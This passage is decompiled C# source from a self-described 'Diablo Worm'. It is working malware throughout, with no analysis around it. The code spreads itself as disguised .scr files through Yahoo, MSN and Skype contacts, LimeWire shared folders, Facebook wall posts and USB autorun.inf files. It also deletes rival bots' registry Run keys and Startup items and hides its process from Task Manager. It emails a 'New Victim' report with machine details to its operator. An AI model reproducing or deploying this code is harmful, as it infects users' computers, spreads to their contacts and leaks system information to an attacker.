    {
      try
      {
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", true).DeleteSubKeyTree("Run");
        MyProject.Computer.Registry.LocalMachine.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", true).DeleteSubKeyTree("Run");
        MyProject.Computer.Registry.LocalMachine.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
        return;
      this.DeleteDirContents(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)));
    }

    public void botkills()
    {
      if (Operators.CompareString(this.botkill, "1", false) != 0)
        return;
      this.botkillv();
      this.botclean();
    }

    public void DeleteDirContents(DirectoryInfo dir)
    {
      FileInfo[] files = dir.GetFiles();
      int index1 = 0;
      while (index1 < files.Length)
      {
        files[index1].Delete();
        checked { ++index1; }
      }
      DirectoryInfo[] directories = dir.GetDirectories();
      int index2 = 0;
      while (index2 < directories.Length)
      {
        this.DeleteDirContents(directories[index2]);
        checked { ++index2; }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Yahoo()
    {
      if (Operators.CompareString(this.TextBox26.Text, "1", false) != 0)
        return;
      try
      {
        Module module = Assembly.GetExecutingAssembly().GetModules()[0];
        string executablePath = Application.ExecutablePath;
        string str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
        if (Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) == 0)
          return;
        string[] directories = Directory.GetDirectories(str);
        int upperBound = directories.GetUpperBound(0);
        int index = 0;
        while (index <= upperBound)
        {
          if (Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0 && !System.IO.File.Exists(directories[index] + "\\ys.scr"))
            System.IO.File.Copy(executablePath, directories[index] + "\\ys.scr");
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void P2P()
    {
      if (Operators.CompareString(this.TextBox17.Text, "1", false) != 0)
        return;
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object) 0)) + "porno-movie.scr");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, Interaction.Environ("programfiles\\Shared\\" + "porno-movie.scr"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void EmailN()
    {
      try
      {
        if (Operators.CompareString(this.TextBox22.Text, "0", false) != 0)
          ;
        if (System.IO.File.Exists("C:\\WINDOWS\\Temp\\internet.txt"))
          this.TextBox22.Text = "0";
        if (Operators.CompareString(this.TextBox22.Text, "1", false) != 0)
          return;
        new SmtpClient("smtp.live.com")
        {
          Port = Conversions.ToInteger(this.TextBox25.Text),
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox24.Text, this.TextBox23.Text)),
          EnableSsl = true
        }.Send(new MailMessage()
        {
          From = new MailAddress(this.TextBox24.Text),
          To = {
            this.TextBox24.Text
          },
          Subject = "+---New Victim !---+" + MyProject.Computer.Name,
          Body = "[Diablo Worm /+\\ New Victim !]\r\n\r\nComputer Name:    " + MyProject.Computer.Name + "\r\nOS:    " + MyProject.Computer.Info.OSFullName + "\r\nRAM:    "
        });
        new StreamWriter("C:\\WINDOWS\\Tempinternet.txt").Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void USB()
    {
      if (Operators.CompareString(this.TextBox12.Text, "1", false) != 0)
        return;
      try
      {
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          try
          {
            System.IO.File.Copy(Application.ExecutablePath, str + "black.scr");
            StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
            streamWriter.WriteLine("[autorun]");
            streamWriter.WriteLine("open=" + str + "black.scr");
            streamWriter.WriteLine("shellexecute=" + str, (object) 1);
            streamWriter.Close();
            System.IO.File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
            System.IO.File.SetAttributes(str + "black.scr", FileAttributes.Hidden);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void MSN()
    {
      Module module = Assembly.GetExecutingAssembly().GetModules()[0];
      string executablePath = Application.ExecutablePath;
      string str = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
      if (Operators.CompareString(FileSystem.Dir(str, FileAttribute.Directory), "", false) == 0)
        return;
      string[] directories = Directory.GetDirectories(str);
      int upperBound = directories.GetUpperBound(0);
      int index = 0;
      while (index <= upperBound)
      {
        if (Operators.CompareString(FileSystem.Dir(directories[index], FileAttribute.Directory), "", false) != 0 && !System.IO.File.Exists(directories[index] + "\\picture.scr"))
          System.IO.File.Copy(executablePath, directories[index] + "\\picture.scr");
        checked { ++index; }
      }
    }

    public void LAN()
    {
      if (Operators.CompareString(this.TextBox13.Text, "1", false) != 0)
        ;
    }

    public void MSkypeS()
    {
      if (Operators.CompareString(this.TextBox14.Text, "1", false) != 0)
        return;
      object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.Skype"));
      NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue1, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(objectValue1, (System.Type) null, "Attach", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      try
      {
        foreach (object obj in (IEnumerable) NewLateBinding.LateGet(objectValue1, (System.Type) null, "Friends", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))
        {
          object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
          object Instance1 = objectValue1;
          object[] objArray1 = new object[2];
          object[] objArray2 = objArray1;
          object Instance2 = objectValue2;
          object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "Handle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          objArray2[0] = objectValue3;
          object[] objArray3 = objArray1;
          TextBox textBox15 = this.TextBox15;
          string text = textBox15.Text;
          objArray3[1] = (object) text;
          object[] objArray4 = objArray1;
          object[] Arguments = objArray4;
          bool[] flagArray = new bool[2]{ true, true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(Instance1, (System.Type) null, "SendMessage", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            NewLateBinding.LateSetComplex(Instance2, (System.Type) null, "Handle", new object[1]
            {
              RuntimeHelpers.GetObjectValue(objArray4[0])
            }, (string[]) null, (System.Type[]) null, true, false);
          if (flagArray[1])
            textBox15.Text = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[1]), typeof (string));
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public void CacherFichier()
    {
      if (Operators.CompareString(this.TextBox19.Text, "1", false) != 0)
        return;
      if (Operators.CompareString(this.TextBox7.Text, "1", false) == 0)
      {
        try
        {
          new FileInfo("C:\\Windows\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox6.Text, "1", false) == 0)
      {
        try
        {
          new FileInfo("C:\\Windows\\Temp\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(this.TextBox8.Text, "1", false) != 0)
        return;
      try
      {
        new FileInfo("C:\\Windows\\System32\\" + this.TextBox5.Text + ".exe").Attributes = FileAttributes.Hidden;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void persit()
    {
      if (Operators.CompareString(this.TextBox21.Text, "1", false) != 0)
        return;
      new Thread(new ThreadStart(RegPersistence.Persistence)).Start();
    }

    public void FBWall(string message)
    {
      if (Operators.CompareString(this.TextBox26.Text, "1", false) != 0)
        return;
      try
      {
        WebBrowser webBrowser = new WebBrowser();
        webBrowser.Navigate("http://m.facebook.com/home.php?");
        while (webBrowser.ReadyState != WebBrowserReadyState.Complete)
          Application.DoEvents();
        try
        {
          foreach (HtmlElement htmlElement in webBrowser.Document.All)
          {
            if (Operators.CompareString(htmlElement.GetAttribute("name"), "status", false) == 0)
              htmlElement.SetAttribute("value", message);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        try
        {
          foreach (HtmlElement htmlElement in webBrowser.Document.All)
          {
            if (Operators.CompareString(htmlElement.GetAttribute("name"), "update", false) == 0)
              htmlElement.InvokeMember("click");
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      this.USB();
      this.LAN();
      this.MSkypeS();
      this.Yahoo();
      this.P2P();
      this.MSN();
      this.FBWall(this.TextBox15.Text);
    }

    private void Timer3_Tick(object sender, EventArgs e) => this.HideProcess(Application.ProductName);

    private object HideProcess(string pName, bool pHide = true)
    {
label_0:
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string str1 = (string) null;
        ref string local1 = ref str1;
        string str2 = "Windows Task Manager";
        ref string local2 = ref str2;
        int window = Form1.apiFindWindow(ref local1, ref local2);
label_2:
        num3 = 3;
        int num4 = 0;
label_3:
        num3 = 4;
        int hwndLock = 0;
label_4:
        num3 = 5;
        int hwnd = 0;
label_5:
        num3 = 6;
        int menu = Form1.apiGetMenu(window);
label_6:
        num3 = 7;
        int subMenu1 = Form1.apiGetSubMenu(menu, 2);
label_7:
        num3 = 8;
        int subMenu2 = Form1.apiGetSubMenu(subMenu1, 1);
label_8:
        num3 = 9;
        int menuItemId1 = Form1.apiGetMenuItemID(subMenu1, 0);
label_9:
        num3 = 10;
        int menuItemId2 = Form1.apiGetMenuItemID(subMenu2, 0);
label_10:
        num3 = 11;
        int menuItemId3 = Form1.apiGetMenuItemID(subMenu2, 1);
label_11:
        num3 = 12;
        int menuItemId4 = Form1.apiGetMenuItemID(subMenu2, 2);
label_12:
        num3 = 13;
        int menuItemId5 = Form1.apiGetMenuItemID(subMenu2, 3);
label_13:
        num3 = 14;
        if (!pHide)
          goto label_61;
label_14:
        num3 = 15;
        Process process = new Process();
label_15:
        num3 = 16;
        int num5 = 1;
label_16:
        num3 = 17;
        int hWnd1_1 = window;
        int hWnd2_1 = num4;
        string str3 = (string) null;
        ref string local3 = ref str3;
        string str4 = (string) null;
        ref string local4 = ref str4;
        num4 = Form1.apiFindWindowEx(hWnd1_1, hWnd2_1, ref local3, ref local4);
label_17:
        num3 = 18;
        if (hwndLock != 0)
          goto label_19;
label_18:
        num3 = 19;
        int hWnd1_2 = num4;
        string str5 = "SysListView32";
        ref string local5 = ref str5;
        string str6 = "Processes";
        ref string local6 = ref str6;
        hwndLock = Form1.apiFindWindowEx(hWnd1_2, 0, ref local5, ref local6);
label_19:
        num3 = 21;
        if (hwnd != 0)
          goto label_21;
label_20:
        num3 = 22;
        int hWnd1_3 = hwndLock;
        string str7 = "SysHeader32";
        ref string local7 = ref str7;
        string str8 = (string) null;
        ref string local8 = ref str8;
        hwnd = Form1.apiFindWindowEx(hWnd1_3, 0, ref local7, ref local8);
label_21:
        num3 = 24;
        checked { ++num5; }
        if (num5 <= 7)
          goto label_16;
label_22:
        num3 = 25;
        int hWnd1 = window;
        int wParam1 = menuItemId5;
        string str9 = Conversions.ToString(0);
        ref string local9 = ref str9;
        Form1.apiSendMessage(hWnd1, 273, wParam1, ref local9);
label_23:
        num3 = 26;
        Form1.apiEnableMenuItem(menu, menuItemId1, 1);
label_24:
        num3 = 27;
        Form1.apiEnableMenuItem(menu, menuItemId2, 1);
label_25:
        num3 = 28;
        Form1.apiEnableMenuItem(menu, menuItemId3, 1);
label_26:
        num3 = 29;
        Form1.apiEnableMenuItem(menu, menuItemId4, 1);
label_27:
        num3 = 30;
        Form1.apiEnableMenuItem(menu, menuItemId5, 1);
label_28:
        num3 = 31;
        Form1.apiEnableWindow(hwnd, 0);
label_29:
        num3 = 32;
        if (this.ListView1.Items.Count <= 0)
          goto label_31;
label_30:
        num3 = 33;
        this.ListView1.Items.Clear();
label_31:
        num3 = 35;
        Process[] processes = Process.GetProcesses();
label_32:
        num3 = 36;
        Process[] processArray = processes;
        int index1 = 0;
        goto label_43;
label_34:
        num3 = 37;
        int num6;
        checked { ++num6; }
label_35:
        num3 = 38;
        if (Operators.CompareString(process.ProcessName.ToString(), "Idle", false) != 0)
          goto label_38;
label_36:
        num3 = 39;
        ListViewItem listViewItem1 = this.ListView1.Items.Add("System Idle Process");
label_37:
        listViewItem1 = (ListViewItem) null;
        goto label_41;
label_38:
        num3 = 42;
label_39:
        num3 = 43;
        ListViewItem listViewItem2 = this.ListView1.Items.Add(process.ProcessName.ToString());
label_40:
        listViewItem2 = (ListViewItem) null;
label_41:
        checked { ++index1; }
label_42:
        num3 = 46;
label_43:
        if (index1 < processArray.Length)
        {
          process = processArray[index1];
          goto label_34;
        }
label_44:
        num3 = 47;
        int num7 = checked (num6 - 1);
        int index2 = 0;
        goto label_49;
label_45:
        num3 = 48;
        string Left = this.ListView1.Items[index2].Text.ToString();
label_46:
        num3 = 49;
        if (Operators.CompareString(Left, pName, false) != 0)
          goto label_48;
label_47:
        num3 = 50;
        int num8 = index2;
label_48:
        num3 = 52;
        checked { ++index2; }
label_49:
        if (index2 <= num7)
          goto label_45;
label_50:
        num3 = 53;
        Form1.apiLockWindowUpdate(hwndLock);
label_51:
        num3 = 54;
        int hWnd2 = window;
        int wParam2 = menuItemId1;
        string str10 = Conversions.ToString(0);
        ref string local10 = ref str10;
        Form1.apiSendMessage(hWnd2, 273, wParam2, ref local10);
label_52:
        num3 = 55;
        int hWnd3 = hwndLock;
        string str11 = (string) null;
        ref string local11 = ref str11;
        Form1.apiSendMessage(hWnd3, 4144, 0, ref local11);
label_53:
        num3 = 56;
        int hWnd4 = hwndLock;
        int wParam3 = num8;
        string str12 = Conversions.ToString(0);
        ref string local12 = ref str12;
        Form1.apiSendMessage(hWnd4, 4104, wParam3, ref local12);
label_54:
        num3 = 57;
        Form1.apiLockWindowUpdate(0);
label_55:
        num3 = 58;
        if (window != 0)
          goto label_58;
label_56:
        num3 = 59;
        if (this.Timer1.Interval == 800)
          goto label_77;
label_57:
        num3 = 60;
        this.Timer1.Interval = 800;
        goto label_77;
label_58:
        num3 = 63;
label_59:
        num3 = 64;
        if (this.Timer1.Interval == 2500)
          goto label_77;
label_60:
        num3 = 65;
        this.Timer1.Interval = 2500;
        goto label_77;
label_61:
        num3 = 69;
label_62:
        num3 = 70;
        int num9 = 1;
label_63:
        num3 = 71;
        int hWnd1_4 = window;
        int hWnd2_2 = num4;
        string str13 = (string) null;
        ref string local13 = ref str13;
        string str14 = (string) null;
        ref string local14 = ref str14;
        num4 = Form1.apiFindWindowEx(hWnd1_4, hWnd2_2, ref local13, ref local14);
label_64:
        num3 = 72;
        if (hwndLock != 0)
          goto label_66;
label_65:
        num3 = 73;
        int hWnd1_5 = num4;
        string str15 = "SysListView32";
        ref string local15 = ref str15;
        string str16 = "Processes";
        ref string local16 = ref str16;
        hwndLock = Form1.apiFindWindowEx(hWnd1_5, 0, ref local15, ref local16);
label_66:
        num3 = 75;
        if (hwnd != 0)
          goto label_68;
label_67:
        num3 = 76;
        int hWnd1_6 = hwndLock;
        string str17 = "SysHeader32";
        ref string local17 = ref str17;
        string str18 = (string) null;
        ref string local18 = ref str18;
        hwnd = Form1.apiFindWindowEx(hWnd1_6, 0, ref local17, ref local18);
label_68:
        num3 = 78;
        checked { ++num9; }
        if (num9 <= 7)
          goto label_63;
label_69:
        num3 = 79;
        Form1.apiEnableMenuItem(menu, menuItemId1, 0);
label_70:
        num3 = 80;
        Form1.apiEnableMenuItem(menu, menuItemId2, 0);
label_71:
        num3 = 81;
        Form1.apiEnableMenuItem(menu, menuItemId3, 0);
label_72:
        num3 = 82;
        Form1.apiEnableMenuItem(menu, menuItemId4, 0);
label_73:
        num3 = 83;
        Form1.apiEnableMenuItem(menu, menuItemId5, 0);
label_74:
        num3 = 84;
        int hWnd5 = window;
        int wParam4 = menuItemId3;
        string str19 = Conversions.ToString(0);
        ref string local19 = ref str19;
        Form1.apiSendMessage(hWnd5, 273, wParam4, ref local19);
label_75:
        num3 = 85;
        int hWnd6 = window;
        int wParam5 = menuItemId1;
        string str20 = Conversions.ToString(0);
        ref string local20 = ref str20;
        Form1.apiSendMessage(hWnd6, 273, wParam5, ref local20);
label_76:
        num3 = 86;
        Form1.apiEnableWindow(hwnd, 1);
label_77:
        num3 = 88;
        obj1 = (object) true;
        goto label_84;
label_79:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num10 = num2 + 1;
            num2 = 0;
            switch (num10)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
              case 21:
                goto label_19;
              case 22:
                goto label_20;
              case 23:
              case 24:
                goto label_21;
              case 25:
                goto label_22;
              case 26:
                goto label_23;
              case 27:
                goto label_24;
              case 28:
                goto label_25;
              case 29:
                goto label_26;
              case 30:
                goto label_27;
              case 31:
                goto label_28;
              case 32:
                goto label_29;
              case 33:
                goto label_30;
              case 34:
              case 35:
                goto label_31;
              case 36:
                goto label_32;
              case 37:
                goto label_34;
              case 38:
                goto label_35;
              case 39:
                goto label_36;
              case 40:
                goto label_37;
              case 41:
              case 45:
                goto label_41;
              case 42:
                goto label_38;
              case 43:
                goto label_39;
              case 44:
                goto label_40;
              case 46:
                goto label_42;
              case 47:
                goto label_44;
              case 48:
                goto label_45;
              case 49:
                goto label_46;
              case 50:
                goto label_47;
              case 51:
              case 52:
                goto label_48;
              case 53:
                goto label_50;
              case 54:
                goto label_51;
              case 55:
                goto label_52;
              case 56:
                goto label_53;
              case 57:
                goto label_54;
              case 58:
                goto label_55;
              case 59:
                goto label_56;
              case 60:
                goto label_57;
              case 61:
              case 62:
              case 66:
              case 67:
              case 68:
              case 87:
              case 88:
                goto label_77;
              case 63:
                goto label_58;
              case 64:
                goto label_59;
              case 65:
                goto label_60;
              case 69:
                goto label_61;
              case 70:
                goto label_62;
              case 71:
                goto label_63;
              case 72:
                goto label_64;
              case 73:
                goto label_65;
              case 74:
              case 75:
                goto label_66;
              case 76:
                goto label_67;
              case 77:
              case 78:
                goto label_68;
              case 79:
                goto label_69;
              case 80:
                goto label_70;
              case 81:
                goto label_71;
              case 82:
                goto label_72;
              case 83:
                goto label_73;
              case 84:
                goto label_74;
              case 85:
                goto label_75;
              case 86:
                goto label_76;
              case 89:
                goto label_84;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_79;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_84:
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    public int ProcessesRunning(string ProcessName)
    {
      int num;
      try
      {
        num = checked (Process.GetProcessesByName(ProcessName).GetUpperBound(0) + 1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num = 0;
        ProjectData.ClearProjectError();
      }
      return num;
    }
  }
}
